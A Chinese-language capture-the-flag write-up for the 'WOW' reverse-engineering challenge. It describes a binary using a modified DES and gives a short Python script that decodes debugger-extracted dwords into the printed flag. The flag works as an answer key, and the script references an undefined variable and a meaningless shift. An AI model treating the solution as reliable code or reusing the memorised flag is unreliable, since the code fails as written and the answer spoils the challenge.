    猫头鹰被传销骗了，说要找到到天堂门（heaven’s gate），门后竟是...
    题目地址 https://fake-owlll-1308188104.cos.ap-nanjing.myqcloud.com/week4/WOW.exe
    基准分数 500
### 分析
题目本身存在解密算法，将内存中数据修改后即可输出flag。正解思路是个魔改的DES加密。
### exp
```python

# # WOW 
# get from ida debug
flagwow = [0x6D616768,0x4F577B65,0x5F574F57,0x70704068,0x336E5F79,0x65795F77,0x325F7234,0x7D323230]
print (flaglist)
for i in flagwow:
    print (chr(i&0xff),end='')
    print (chr(i>>8&0xff),end='')
    print (chr(i>>16&0xff),end='')
    print (chr(i>>24&0xff),end='')
    print (chr(i>>32&0xff),end='')
# hgame{WOWOW_h@ppy_n3w_ye4r_2022}
```
# 附件
见同级目录相关文件夹